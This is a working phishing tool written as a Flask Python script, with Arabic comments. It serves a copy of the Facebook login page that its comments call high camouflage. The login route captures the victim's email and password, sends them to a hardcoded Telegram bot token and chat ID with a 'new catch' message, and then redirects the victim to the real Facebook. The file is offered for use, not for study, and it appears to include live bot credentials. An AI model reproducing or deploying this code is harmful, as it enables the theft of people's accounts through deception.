from flask import Flask, render_template_string, request, redirect
import requests

app = Flask(__name__)

# --- إعدادات فارس والحاج (صحيحة 100%) ---
TOKEN = "8599495749:AAFIQkYkNLJV_Xn_ZckTIxFoTp8Fm4ChlG0" # التوكن الجديد
CHAT_ID = "7479786207" # الآيدي الخاص بك

# واجهة فيسبوك احترافية (تمويه عالي)
html_ui = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { background: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; margin: 0; }
        .header-text { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; }
        .card p { font-size: 18px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        .btn-login { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 20px; font-size: 12px; color: #8a8d91; }
    </style>
</head>
<body>
    <div class="header-text">facebook</div>
    <div class="card">
        <p>سجل دخولك للمتابعة</p>
        <form action="/login" method="POST">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit" class="btn-login">تسجيل الدخول</button>
        </form>
    </div>
    <div class="footer">تطوير: المطور فارس والحاج © 2026</div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_ui)

@app.route('/login', methods=['POST'])
def login():
    u = request.form.get('email')
    p = request.form.get('password')
    
    # إرسال التبليغ للفارس
    msg = f"✅ صيد جديد يا فارس! ✅\\n\\n👤 الحساب: {u}\\n🔑 كلمة السر: {p}"
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
    except:
        pass
        
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
